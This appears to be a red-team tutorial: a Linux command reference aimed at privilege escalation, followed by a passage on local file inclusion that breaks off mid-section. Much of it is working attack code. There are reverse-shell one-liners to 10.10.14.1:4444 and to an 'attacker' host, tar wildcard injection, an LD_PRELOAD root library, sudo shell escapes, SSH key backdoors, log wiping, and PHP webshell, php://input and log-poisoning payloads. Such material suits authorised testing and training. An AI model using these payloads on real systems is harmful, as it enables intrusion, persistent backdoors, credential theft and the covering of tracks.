└────────── file type: - = regular, d = directory, l = symlink, s = socket **permission bits:** octal notation adds the bits: `rwx` = 4+2+1 = **7**, `r-x` = 4+0+1 = **5**, `rw-` = 4+2+0 = **6**.

so `chmod 755` = `rwxr-xr-x` (owner full, everyone else read+execute). special bits **suid is a privesc goldmine.** if a binary runs as root (owner=root, suid set), any code execution inside it gives you root. -rwsr-xr-x  root  root  /usr/bin/passwd
    ↑ 's' in execute position = suid set access control lists (acls) beyond the basic rwx, `setfacl`/`getfacl` allow per-user, per-group rules on individual files — check these when standard permissions look locked but something still has access. # view permissions
ls -la /etc/passwd
stat /etc/shadow

# change permissions
chmod 755 script.sh
chmod u+x script.sh         # add execute for owner
chmod o-w file.txt          # remove write for others
chmod 600 ~/.ssh/id_rsa     # ssh key must be 600 or ssh refuses it

# change owner / group
chown alice:devs file.txt
chown -r www-data:www-data /var/www/html

# find suid binaries (privesc hunting)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# find sgid binaries
find / -perm -2000 -type f 2>/dev/null

# find world-writable files/directories
find / -perm -o+w -type f 2>/dev/null
find / -perm -o+w -type d 2>/dev/null

# find world-writable directories (drop payloads)
find / -writable -type d 2>/dev/null

# read acls
getfacl /etc/passwd
getfacl -r /var/www/html

# check capabilities (another privesc vector)
getcap -r / 2>/dev/null
# e.g. python3 cap_setuid+eip → can setuid to root users, groups & identity linux identifies users and groups by **uid** (user id) and **gid** (group id) — not by name. names are just a lookup in `/etc/passwd`. key files **`/etc/passwd`** — one line per user: root:x:0:0:root:/root:/bin/bash
alice:x:1001:1001::/home/alice:/bin/bash
nobody:x:65534:65534::/nonexistent:/usr/sbin/nologin `username : password_placeholder : uid : gid : comment : home : shell`

the `x` in the password field means the hash is in `/etc/shadow`. an empty field means no password. a `*` or `!` means login disabled.

**`/etc/shadow`** — password hashes, readable only by root: alice:$6$rounds=5000$salt$hash...:19120:0:99999:7::: format: `$id$salt$hash` — `$6$` = sha-512, `$5$` = sha-256, `$1$` = md5, `$2y$` = bcrypt.

**`/etc/group`** — group memberships: sudo:x:27:alice,bob
docker:x:998:alice privileged groups to know real vs effective uid every process has three uids: **real** (who launched it), **effective** (what it runs as — changed by suid), and **saved** (the original effective, for privilege drop). `id` shows your current real and effective. # who am i?
id
whoami

# all logged-in users
who
w
last            # login history
lastlog         # last login per user

# all users on the system
cat /etc/passwd
cat /etc/passwd | grep -v nologin | grep -v false   # users with shells
awk -f: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd   # human users

# groups
cat /etc/group
groups alice    # groups a user belongs to
id alice

# sudo configuration
cat /etc/sudoers
cat /etc/sudoers.d/*
sudo -l         # what can you run with sudo

# switch user
su - alice      # switch to alice (needs password)
sudo -i         # root shell if permitted
sudo -u alice bash

# add user to sudo group (if you have permission)
usermod -ag sudo alice

# read shadow file (if root or in shadow group)
cat /etc/shadow

# crack hashes offline
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt   # sha-512
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt file manipulation & text processing these commands form the backbone of any shell session — reading files, searching content, transforming output, and chaining operations together. # reading files
cat /etc/passwd
less /var/log/syslog     # paginated, searchable with /
tail -f /var/log/auth.log   # follow live (great for monitoring)
head -20 /etc/passwd

# searching in files
grep -r "password" /etc/ 2>/dev/null        # recursive search
grep -ri "password" /var/www/ 2>/dev/null  # case insensitive
grep -rn "password" . 2>/dev/null          # show line numbers
grep -v "#" /etc/ssh/sshd_config           # exclude comments
grep -e "root|admin" /etc/passwd           # extended regex

# find strings in binaries
strings /usr/bin/interesting_binary | grep -i pass

# cut — extract fields from delimited text
cut -d: -f1 /etc/passwd              # first field (username)
cut -d: -f1,3 /etc/passwd            # username and uid

# awk — field processing
awk -f: '{print $1, $3}' /etc/passwd
awk -f: '$3 == 0 {print $1}' /etc/passwd   # users with uid 0 (should only be root)

# sed — stream editor / find-replace
sed 's/old/new/g' file.txt
sed -n '10,20p' file.txt              # print lines 10–20

# sort, uniq
cat /var/log/auth.log | grep "failed" | awk '{print $11}' | sort | uniq -c | sort -rn
# ↑ count failed ssh login attempts per source ip

# wc — word/line count
wc -l /etc/passwd

# file type
file /usr/bin/python3
file mystery_file

# base64
echo "hello" | base64
echo "agvsbg8k" | base64 -d

# hashing
md5sum /etc/passwd
sha256sum suspicious_binary

# copy / move / delete
cp -r /opt/app /tmp/backup
mv old_name new_name
rm -rf /tmp/old_payload    # careful

# create / write
touch empty_file
echo "content" > file.txt
echo "more" >> file.txt
printf "line1\nline2\n" > file.txt process management a **process** is a running instance of a program. every process has a pid, a parent pid (ppid), an owner (uid), and a set of open file descriptors.

**process states:**
- `r` — running / runnable
- `s` — sleeping (interruptible)
- `d` — sleeping (uninterruptible, usually i/o)
- `z` — zombie (finished but parent hasn't reaped it)
- `t` — stopped (sigstop or traced by debugger)

**signals — important ones:** **red team relevance:** killing monitoring/av processes requires sigkill and root. processes running as root with user-controlled input are privilege escalation targets. background processes listening on sockets are pivot targets. # snapshot of all processes
ps aux
ps -eff                      # full format with ppid
ps aux | grep apache

# live process monitor
top
htop                         # better ui (may need installing)

# process tree
pstree -p

# find process by name / port
pgrep nginx
pgrep -a sshd                # with full command line
ss -tlnp                     # sockets with owning process
netstat -tlnp                # same (older)
lsof -i :80                  # what's on port 80
lsof -p 1234                 # open files for pid 1234

# kill processes
kill 1234             # sigterm (15)
kill -9 1234          # sigkill
killall nginx
pkill -9 python3

# background / foreground
long_command &        # run in background
jobs                  # list background jobs
fg %1                 # bring job 1 to foreground
bg %1                 # send to background
ctrl+z                # suspend current process
nohup ./payload &     # survive terminal close
disown %1             # detach from terminal entirely

# screen / tmux — persist sessions across disconnects
screen -s mysession
screen -ls
screen -r mysession
tmux new -s hack
tmux ls
tmux attach -t hack

# red team: read other processes' environment (may have secrets)
cat /proc/1337/environ 2>/dev/null | tr '\0' '\n'
strings /proc/1337/mem 2>/dev/null   # requires root

# find processes running as root
ps aux | awk '$1=="root" {print}' services & systemd modern linux systems use **systemd** as pid 1 — it manages services (called *units*), handles boot order, logging (journald), and more.

a service unit file at `/etc/systemd/system/myservice.service` or `/lib/systemd/system/` defines how the service starts, stops, restarts, and what user it runs as. [unit]
description=my web app
after=network.target

[service]
user=www-data
workingdirectory=/opt/app
execstart=/usr/bin/python3 app.py
restart=on-failure

[install]
wantedby=multi-user.target **red team:** if you can write to a service unit file (or the binary it calls), you control code that runs as whatever `user=` is set to — often root for system services. unit files in writable paths are a classic privesc vector. # service status
systemctl status ssh
systemctl status nginx

# start / stop / restart / reload
systemctl start nginx
systemctl stop nginx
systemctl restart nginx
systemctl reload nginx      # reload config without restart

# enable / disable at boot
systemctl enable ssh
systemctl disable ssh

# list all services
systemctl list-units --type=service
systemctl list-units --type=service --state=running

# view service logs (journald)
journalctl -u nginx
journalctl -u nginx -f      # follow live
journalctl -u nginx --since "1 hour ago"
journalctl -xe              # last boot, verbose

# find writable service files (privesc check)
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null

# find services running as root with writable execstart binary
systemctl list-units --type=service --state=running | awk '{print $1}' | \
  xargs -i{} systemctl show {} --property=execstart,user 2>/dev/null

# reload after editing unit file
systemctl daemon-reload
systemctl restart modified-service cron jobs — scheduled tasks **cron** runs commands on a schedule. it's one of the most common privilege escalation vectors because scripts run automatically — often as root — without anyone watching.

**cron syntax:** * * * * *  command
│ │ │ │ └── day of week (0=sun … 6=sat)
│ │ │ └──── month (1–12)
│ │ └────── day of month (1–31)
│ └──────── hour (0–23)
└────────── minute (0–59) examples:
- `0 * * * *` — every hour on the hour
- `*/5 * * * *` — every 5 minutes
- `0 2 * * 0` — 2am every sunday
- `@reboot` — on boot

**where cron jobs live:** **classic privesc patterns:**
- root's crontab runs a script that's world-writable → overwrite it
- root's crontab calls a binary whose *directory* is writable → drop a malicious file with the same name
- root's crontab uses a wildcard `*` with `tar`, `chown`, `chmod` → argument injection
- script uses a path that includes `/tmp` before system paths → drop a malicious binary named the same # view your crontab
crontab -l

# system crontabs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
cat /etc/cron.d/*

# all user crontabs (root only)
cat /var/spool/cron/crontabs/*

# watch for processes spawned by cron (reveals hidden cron jobs)
watch -n 1 "ps aux --sort=start_time | tail -20"
# or use pspy — no root needed, monitors procfs
curl -slo /tmp/pspy https://github.com/dominicbreuker/pspy/releases/latest/download/pspy64
chmod +x /tmp/pspy && /tmp/pspy

# find scripts called by cron that are writable
crontab -l 2>/dev/null | grep -oe '/[^ ]+' | xargs ls -la 2>/dev/null

# tar wildcard injection — if cron runs: tar -czf backup.tgz *
# create files that become arguments to tar:
echo "/bin/bash -i >& /dev/tcp/attacker/4444 0>&1" > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# edit a writable cron script
echo 'chmod u+s /bin/bash' >> /path/to/writable_cron_script.sh
# wait for cron to run, then:
bash -p    # -p preserves suid effective uid environment variables & path hijacking **environment variables** are key=value pairs inherited by processes from their parent. they affect behaviour at runtime. path hijacking if a suid binary (or a sudo rule) calls a command by *name* without an absolute path, and you control a directory that appears earlier in path, you win: # vulnerable binary calls: system("cat /etc/passwd") internally
# export a modified path with /tmp first
export path=/tmp:$path
# drop a fake 'cat' in /tmp
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
# run the vulnerable binary
./vuln_binary   # calls /tmp/cat instead of /bin/cat → root shell ld_preload if a sudo rule allows running a binary and `env_keep+=ld_preload` is set in sudoers, you can inject a shared library into a root process: // inject.c
#include <stdio.h>
#include <unistd.h>
void __attribute__((constructor)) pwn() {
    setuid(0); setgid(0);
    system("/bin/bash");
} gcc -shared -fpic -o /tmp/inject.so inject.c
sudo ld_preload=/tmp/inject.so /usr/bin/allowed_binary # print all environment variables
env
printenv
set | head -40

# specific variables
echo $path
echo $home
echo $shell
echo $ld_preload

# bash history — credentials frequently appear here
cat ~/.bash_history
cat ~/.zsh_history
cat /home/*/.bash_history 2>/dev/null

# find env vars containing 'pass' or 'key'
env | grep -i -e 'pass|key|secret|token|api'

# check sudo rules for unsafe env settings
sudo -l | grep -e 'env_keep|setenv|ld_'

# persistent environment (set for all sessions)
cat ~/.bashrc
cat ~/.profile
cat ~/.bash_profile
cat /etc/environment
cat /etc/profile
ls /etc/profile.d/

# temporarily add /tmp to path
export path=/tmp:$path

# check which 'python' gets found
which python python3 pip
type python3 networking commands from an active session, these commands tell you where you are, what's listening, and what you can reach. # interface and address info
ip addr show
ip link show
ifconfig -a              # older systems

# routing table
ip route show
route -n

# dns configuration
cat /etc/resolv.conf
cat /etc/hosts           # local overrides — may reveal internal hostnames

# active connections and listening ports
ss -tlnp                 # tcp listening
ss -tulnp                # tcp + udp listening
ss -anp                  # all connections with process names
netstat -tlnp            # older alternative
lsof -i                  # all network file descriptors
lsof -i :22              # specific port

# arp cache
ip neigh
arp -n

# firewall rules (requires root)
iptables -l -n -v
iptables -t nat -l -n    # nat rules
nft list ruleset         # nftables (newer)

# port forwarding / tunneling from the box
# ssh local port forward — reach internal service via pivot
ssh -l 8080:10.10.10.5:80 user@pivot
# ssh dynamic socks proxy
ssh -d 1080 user@pivot
# chisel — tcp tunnel over http
chisel server -p 8080 --reverse    # on attacker
chisel client attacker:8080 r:3306:127.0.0.1:3306   # on target

# dns lookups
nslookup internal.corp
dig internal.corp
dig -x 10.10.10.1        # reverse lookup

# check connectivity
curl -v http://10.10.10.5
wget -qo- http://10.10.10.5
ping -c 3 10.10.10.1
nc -zv 10.10.10.5 22     # port check ssh — secure shell ssh is your primary method of remote access on linux. understanding it deeply matters both for using it effectively and for attacking it. key-based authentication ~/.ssh/id_rsa        private key (protect with chmod 600)
~/.ssh/id_rsa.pub    public key (share freely)
~/.ssh/authorized_keys   public keys allowed to log in as this user
~/.ssh/known_hosts   previously seen server fingerprints
~/.ssh/config        client config (aliases, port, identity file) **ssh config file** (`~/.ssh/config`) makes complex connections simple: host pivot
    hostname 10.10.10.5
    user alice
    identityfile ~/.ssh/id_rsa_pivot
    port 2222

host internal
    hostname 10.20.0.50
    user root
    proxyjump pivot    # route through pivot automatically red team ssh techniques **agent forwarding** (`ssh -a`) forwards your ssh agent through a pivot, allowing you to ssh from the pivot to other machines using your local keys — but it also lets the pivot host (if compromised) use your agent.

**ssh authorized_keys persistence** — if you get write access to `~/.ssh/authorized_keys` for any user, add your public key for persistent backdoor access.

**private key hunting** — ssh private keys are frequently left in home directories, backups, container images, and git repos. # basic connection
ssh user@10.10.10.5
ssh -p 2222 user@10.10.10.5
ssh -i ~/.ssh/id_rsa user@10.10.10.5

# generate keypair
ssh-keygen -t ed25519 -c "attacker" -f ~/.ssh/attack_key

# copy public key to target (authorized access)
ssh-copy-id user@10.10.10.5
# manual: append to authorized_keys
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys

# persistence — add attacker key to root's authorized_keys
echo "ssh-ed25519 aaaa...attacker-key" >> /root/.ssh/authorized_keys

# port forwarding
ssh -l 8080:127.0.0.1:8080 user@10.10.10.5    # local forward
ssh -r 4444:127.0.0.1:4444 user@10.10.10.5    # remote forward
ssh -d 1080 user@10.10.10.5                   # socks proxy

# execute command without full shell
ssh user@10.10.10.5 "cat /etc/passwd"
ssh user@10.10.10.5 "ps aux | grep root"

# crack ssh private key passphrase
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# find ssh keys on a compromised host
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$"   # ssh server config log files — reading the evidence logs are where defenders find attackers — and where attackers find credentials. know where they are, what they contain, and what to look for. **credentials frequently appear in logs** — http basic auth in urls, mysql errors with connection strings, application stack traces printing config values.

**log tampering** — attackers clear or truncate logs to erase evidence. defenders use remote log shipping (syslog-ng, rsyslog, splunk, elk) specifically to make this harder. # follow auth log live (watch for logins during an engagement)
tail -f /var/log/auth.log

# failed ssh login attempts
grep "failed password" /var/log/auth.log
grep "failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# successful ssh logins
grep "accepted password\|accepted publickey" /var/log/auth.log

# who has used sudo recently
grep "sudo" /var/log/auth.log
grep "command" /var/log/auth.log

# web log — look for interesting requests
cat /var/log/nginx/access.log | grep -e "(union|select|exec|cmd|passwd|etc)"
cat /var/log/apache2/access.log | grep " 200 " | awk '{print $7}' | sort | uniq -c | sort -rn

# failed login attempts (binary log)
last
lastb
lastlog

# journald — all logs via systemd
journalctl --since "30 min ago"
journalctl -u ssh
journalctl _uid=0      # all messages from root processes

# search logs for credentials (red team)
grep -rhi "password\|passwd\|secret\|api_key\|token" /var/log/ 2>/dev/null

# clear auth log (anti-forensics — noisy, often detected)
echo > /var/log/auth.log
# or more surgical — remove your own entries:
grep -v "your.ip.address" /var/log/auth.log > /tmp/.auth.log && mv /tmp/.auth.log /var/log/auth.log package management package managers install, update, and remove software. knowing the right tool for the distribution you're on matters. # ── debian / ubuntu / kali — apt ────────────────────────────────────────────
# update package index
apt update

# upgrade all installed packages
apt upgrade
apt full-upgrade    # may remove packages to resolve conflicts

# install / remove
apt install nmap
apt remove nmap
apt purge nmap      # remove + config files

# search
apt search nmap
apt-cache search wordlist

# package info
apt show nmap
dpkg -l nmap                  # files installed by package
dpkg -s /usr/bin/nmap         # which package owns this file
dpkg --get-selections         # all installed packages

# ── rhel / centos / fedora — yum / dnf ─────────────────────────────────────
yum install nmap
dnf install nmap
yum update
yum search nmap
rpm -qa                       # list all installed packages
rpm -qf /usr/bin/nmap         # which package owns this file
rpm -ql nmap                  # files in package

# ── manual install from source ───────────────────────────────────────────────
./configure
make
make install

# ── snap / flatpak ───────────────────────────────────────────────────────────
snap install code
flatpak install flathub org.gimp.gimp

# find what's installed — quick recon on a new box
dpkg -l | grep -i "web\|sql\|php\|python"
rpm -qa | grep -i "apache\|nginx\|mysql" bash scripting fundamentals bash scripts automate repetitive tasks and glue tools together. even basic scripting skills massively speed up enumeration, payload staging, and post-exploitation. #!/bin/bash
# shebang line — tells the os which interpreter to use

# variables
name="alice"
ip="10.10.10.5"
echo "targeting $name at $ip"

# command substitution
kernel=$(uname -r)
echo "kernel: $kernel"
current_user=$(whoami)

# conditionals
if [ -f /etc/shadow ]; then
    echo "shadow readable!"
elif [ -r /etc/passwd ]; then
    echo "passwd readable"
else
    echo "nothing interesting"
fi

# test operators
# -f file exists and is regular file
# -d directory exists
# -r readable    -w writable    -x executable
# -z string is empty    -n string is not empty
# == -eq    != -ne    -lt -gt -le -ge  (numeric)

# loops
for port in 22 80 443 3389; do
    nc -zv -w1 $ip $port 2>/dev/null && echo "$port open"
done

# loop over files
for file in /home/*/.ssh/id_rsa; do
    [ -f "$file" ] && echo "found key: $file"
done

# while loop
counter=0
while [ $counter -lt 5 ]; do
    echo "attempt $counter"
    ((counter++))
done

# read input / read file line by line
while ifs= read -r line; do
    echo "processing: $line"
done < /etc/passwd

# functions
check_port() {
    local host=$1
    local port=$2
    nc -zv -w1 "$host" "$port" 2>/dev/null && echo "$host:$port open" || echo "$host:$port closed"
}
check_port 10.10.10.5 80
check_port 10.10.10.5 443

# exit codes and error handling
set -e           # exit on any error
set -o pipefail  # exit if any pipe command fails
trap 'echo "error at line $lineno"' err

# arguments
echo "script: $0"
echo "first arg: $1"
echo "all args: $@"
echo "arg count: $#"

# useful one-liners for recon scripts
# subnet sweep
for i in $(seq 1 254); do
    ping -c1 -w1 192.168.1.$i &>/dev/null && echo "192.168.1.$i up" &
done; wait

# port scan a host
for port in $(seq 1 1000); do
    (echo > /dev/tcp/10.10.10.5/$port) 2>/dev/null && echo "$port open"
done sudo & privilege escalation vectors **`sudo`** allows running commands as another user (usually root) based on rules in `/etc/sudoers`. it's the most common legitimate path to privilege — and a frequent misconfiguration target. reading sudoers root    all=(all:all) all
alice   all=(all:all) nopasswd: /usr/bin/vim
bob     all=(root) nopasswd: /usr/bin/python3 /opt/script.py
%devs   all=(all) /usr/bin/systemctl restart nginx - `alice` can run `vim` as root without a password — trivial shell escape
- `bob` can run one specific python script as root... but if that script is writable, or if python can import user-controlled files, it escalates
- `%devs` requires a password and can only restart nginx — harder to abuse gtfobins [gtfobins](https://gtfobins.github.io) catalogs shell escapes for binaries commonly found in suid and sudo misconfigurations. if a binary is allowed via sudo, check it.

a few examples: # sudo vim → shell escape
sudo vim -c ':!/bin/bash'

# sudo less → shell escape
sudo less /etc/passwd
# inside less: !bash

# sudo find
sudo find / -exec /bin/bash \;

# sudo python3
sudo python3 -c 'import os; os.system("/bin/bash")'  

# sudo awk
sudo awk 'begin {system("/bin/bash")}'

# sudo tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# sudo nano → ctrl+r then ctrl+x then: reset; sh 1>&0 2>&0 other privesc categories # ── automated tools (run these first on ctfs) ────────────────────────────────
# linpeas — comprehensive automated check
curl -sl https://github.com/carlospolop/peass-ng/releases/latest/download/linpeas.sh | bash

# linenum
wget https://raw.githubusercontent.com/rebootuser/linenum/master/linenum.sh
bash linenum.sh

# lse (linux smart enumeration)
bash lse.sh -l 2

# ── manual checks ────────────────────────────────────────────────────────────
# 1. who am i and what can i do?
id && whoami
sudo -l

# 2. suid / sgid binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# 3. capabilities
getcap -r / 2>/dev/null

# 4. writable config / service files
find /etc /lib/systemd /usr/lib/systemd -writable 2>/dev/null
find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null

# 5. cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# 6. running processes and listening services
ps aux | grep root
ss -tlnp

# 7. interesting files
cat ~/.bash_history
find / -name "*.conf" | xargs grep -li password 2>/dev/null
find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null
find / -name "wp-config.php" 2>/dev/null | xargs cat 2>/dev/null

# 8. nfs shares with no_root_squash
cat /etc/exports
showmount -e localhost

# 9. sensitive /etc files
ls -la /etc/passwd /etc/shadow /etc/group /etc/sudoers 2>/dev/null

# 10. docker group membership
id | grep docker
# if in docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh useful one-liners & shell tricks # spawn a tty from a dumb shell (post-exploitation)
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash

# full interactive tty upgrade
# after spawning pty:
ctrl+z
stty raw -echo; fg
export term=xterm-256color
stty rows 50 cols 220

# pipes and redirects
command > file.txt      # redirect stdout to file (overwrite)
command >> file.txt     # append
command 2>/dev/null     # suppress errors
command 2>&1            # stderr to stdout
command &>/dev/null     # suppress both
command1 | command2     # pipe stdout of 1 into stdin of 2

# background jobs
sleep 3600 &
disown -h %1            # detach from terminal
nohup ./long_script.sh &> /tmp/out.log &

# here-string / heredoc
grep "root" <<< "$(cat /etc/passwd)"
cat << 'eof' > /tmp/script.sh
#!/bin/bash
echo "hello from heredoc"
eof

# networking without tools
# tcp connection via /dev/tcp (bash built-in)
exec 3<>/dev/tcp/10.10.10.5/80
echo -e "get / http/1.1\r\nhost: 10.10.10.5\r\n\r\n" >&3
cat <&3

# reverse shell one-liners
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
nc -e /bin/bash 10.10.14.1 4444

# transfer files without scp
# python http server
python3 -m http.server 8080
# download on target
wget http://10.10.14.1:8080/linpeas.sh
curl -so http://10.10.14.1:8080/linpeas.sh

# find and replace in-place
sed -i 's/old/new/g' file.txt

# multi-line output to file
tee /tmp/results.txt << 'eof'
line 1
line 2
eof

# timing a command
time nmap -t4 -f 10.10.10.5

# watch a command repeatedly
watch -n 2 'ss -tlnp'

# count unique lines
cat access.log | awk '{print $1}' | sort -u | wc -l key takeaways **concepts to have cold:**

- filesystem hierarchy — where things live and why it matters for finding credentials and writable paths
- permission model — read/write/execute for owner/group/others in octal; suid/sgid/sticky as special cases
- uid 0 = root regardless of username — always check `/etc/passwd` for multiple uid 0 entries
- everything is a file — devices, sockets, process info in `/proc`, pipes
- `sudo -l` is the first thing you run after getting a shell
- suid binaries + gtfobins is a solved problem — if it's on the list, it's exploitable
- cron jobs run silently and automatically — writable scripts called by root cron = privesc
- logs tell the full story — both for blue team analysis and red team credential hunting
- ssh keys last forever unless revoked — always check `authorized_keys`, always check for stray private keys
- a dumb shell without tty will break everything — always upgrade with `python3 -c 'import pty; pty.spawn("/bin/bash")'` immediately

**tools to know:**
`find`, `grep`, `awk`, `sed`, `ss`, `ps`, `systemctl`, `crontab`, `sudo`, `id`, `linpeas`, `pspy`, `ssh`, `scp`, `nc`, `curl`

linux mastery is cumulative. every command you understand at the conceptual level — not just by copying it — makes the next one faster to learn. the shell is a force multiplier: the same fluency that makes you a fast sysadmin makes you a fast attacker and a fast defender.

title: LFI — Local File Inclusion from First Principles
summary: How local file inclusion works, every PHP wrapper, log poisoning, /proc tricks, path traversal filters, LFI-to-RCE paths, sensitive files on Linux and Windows,
body:
lfi — local file inclusion from first principles how local file inclusion works, every php wrapper, log poisoning, /proc tricks, path traversal filters, lfi-to-rce paths, sensitive files on linux and windows, and a full exploitation methodology. notes lfi web php path-traversal rce red-team notes local file inclusion is one of those vulnerabilities that looks simple — you swap a filename in a url — but the exploitation depth is enormous. from reading `/etc/passwd` all the way to a full shell, the attack surface is determined by the server's configuration, the application's context, and how creative you get with what you feed the include function.

this guide covers lfi from the mechanics up through every reliable code-execution path, with the filter bypasses and file targets that matter in real engagements. what is file inclusion? file inclusion vulnerabilities arise when a web application takes user-controlled input and passes it to a function that reads or executes a file. in php — still the most common context — those functions are: the critical distinction: `include()` and `require()` **execute php code** inside the included file. `file_get_contents()` just returns bytes. this distinction determines whether you can reach rce.

**classic vulnerable pattern:** <?php
$page = $_get['page'];
include($page . '.php');
?> the developer intended: `?page=about` → includes `about.php`. you supply: `?page=../../../../etc/passwd` → includes the passwd file. the `.php` extension appended by code is a complication we'll deal with. path traversal basics `../` is the traversal sequence — each `../` moves one directory up toward the filesystem root. stack enough of them and you escape the web root. document root: /var/www/html/
vulnerable include: include('/var/www/html/' . $page . '.php')

payload: ../../../../etc/passwd
result:  include('/var/www/html/../../../../etc/passwd.php')
         resolves to: include('/etc/passwd.php') if there's no extension append, it resolves cleanly to `/etc/passwd`.

**how many `../` do you need?** you can't go above `/` — extra traversals are silently ignored. start with `../../../../../` (6 deep). the worst case is a web root sitting at `/var/www/html/app/module/pages/` (4 levels deep) so 6 always gets you to root.

**linux vs windows:**
- linux: `../` and `..%2f`
- windows: `..\`, `..\/`, `..%2f`, `..%5c` all work. windows is also case-insensitive for paths.

**url encoding traversal:** filter bypass techniques most real applications run some kind of sanitisation. here's how developers typically implement it and how each can be bypassed. stripping `../` $page = str_replace('../', '', $_get['page']); this replaces `../` with nothing — but only once per pass. if you double it up, the stripping leaves a new `../`: ....//  →  strip ../  →  ../
....//....//  →  ../../ use `....//` instead of `../` everywhere. extension appending (no null byte in php ≥ 5.3) old php (≤ 5.3) allowed a null byte `%00` to terminate string processing: ?page=../../../../etc/passwd%00
→ include('/etc/passwd') + [ignored] this **does not work in modern php** (5.3.4+ fixed). if you encounter it in ctfs it signals a very old target. fixed extension — using php wrappers instead when the code appends `.php` and you can't use null bytes, php stream wrappers bypass the issue entirely. see the php wrappers section below. path length truncation (very old php) php on some old configurations truncated filenames at 4096 characters: ?page=../../../../etc/passwd/./././././[... 4096 chars total ...] the `.php` gets cut off. largely theoretical on modern systems. double encoding some wafs or filters url-decode once then check. double-encode: %252e%252e%252f  → (decode once) → %2e%2e%2f → (app decodes) → ../ absolute path when no prefix is added if the application just does `include($_get['page'])` with no path prefix, try absolute paths: ?page=/etc/passwd
?page=/var/www/html/config.php php stream wrappers php's stream wrapper system is the most powerful lfi escalation primitive. wrappers are uri-scheme prefixes that change how php reads a "file". they work with `include()`, `file_get_contents()`, and most file-related functions. `php://filter` — read source code without execution this is the most important wrapper for lfi. it lets you read php source code as base64 instead of having it executed: ?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=../config/database.php the output is a base64 blob. decode it locally: echo 'pd9wahagjgrix3bhc3n3b3...' | base64 -d > config.php
cat config.php this reveals hardcoded credentials, api keys, database passwords, and the full application logic — all gold for an engagement.

**reading arbitrary files (no extension issue):** ?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/resource=/etc/shadow `php://input` — execute arbitrary php when `allow_url_include=on` (often off by default but misconfigured), you can post raw php code and have it executed: curl -x post 'http://target/index.php?page=php://input' \
  --data '<?php system($_get["cmd"]); ?>' then: `?page=php://input&cmd=id`

or in one request: curl -x post 'http://target/index.php?page=php://input&cmd=id' \
  --data '<?php system($_get["cmd"]); ?>' `data://` — inline data as php also requires `allow_url_include=on`: ?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,pd9wahagc3lzdgvtkcdpzccpoya/pg== base64 version avoids issues with special characters in the url. `expect://` — direct command execution requires the `expect` php extension (rare but occasionally installed): ?page=expect://id
?page=expect://whoami `zip://` and `phar://` — include files from archives if you can upload a file (even if the server renames it), you can package php inside a zip or phar and include it: # create a php webshell inside a zip
echo '<?php system($_get["cmd"]); ?>' > shell.php
zip shell.zip shell.php
# upload shell.zip to the server (e.g., as an avatar) then: ?page=zip:///var/www/html/uploads/shell.zip#shell
?page=phar:///var/www/html/uploads/shell.zip/shell.php the `#shell` refers to the file inside the archive (without `.php` extension). `file://` — explicit file read ?page=file:///etc/passwd
?page=file:///c:/windows/win.ini useful when the application strips `../` but not the `file://` scheme. lfi to rce: log poisoning log poisoning is the classic lfi-to-rce technique when wrappers are unavailable. the idea: inject php code into a log file, then include the log file. apache access log **step 1 — inject php into the user-agent:** curl -a '<?php system($_get["cmd"]); ?>' http://target/ apache logs every request including the user-agent. the line in `/var/log/apache2/access.log` now contains raw php code.

**step 2 — include the log:** ?page=../../../../var/log/apache2/access.log&cmd=id apache executes the php when it includes the file. output appears inline with the log content.

**common apache/nginx log locations:** /var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log          (centos/rhel)
/var/log/httpd/error_log
/proc/self/fd/1                    (stdout — sometimes works)
/proc/self/fd/2                    (stderr) ssh auth log ssh logs authentication attempts including usernames. the username field is logged — inject php there: ssh '<?php system($_get["cmd"]); ?>'@target
# (connection will fail — that's fine, just need the log entry) then: `?page=../../../../var/log/auth.log&cmd=id`

auth log locations: /var/log/auth.log        (debian/ubuntu)
/var/log/secure          (centos/rhel) `/proc/self/environ` the `/proc/self/environ` pseudo-file contains the environment variables of the current process (apache/php). the http_user_agent and other request headers appear here. curl -a '<?php system($_get["cmd"]); ?>' 'http://target/?page=../../../../proc/self/environ&cmd=id' this works when `/proc/self/environ` is readable by the web server process (common on misconfigured servers). email/mail logs if the server has a mail service and you can send email to a local user: /var/mail/www-data
/var/spool/mail/www-data send a php payload as the mail body, then include the mail spool file. session files php stores session data in files. if you can control session variable values, inject php there: /var/lib/php/sessions/sess_[sessionid]
/tmp/sess_[sessionid]
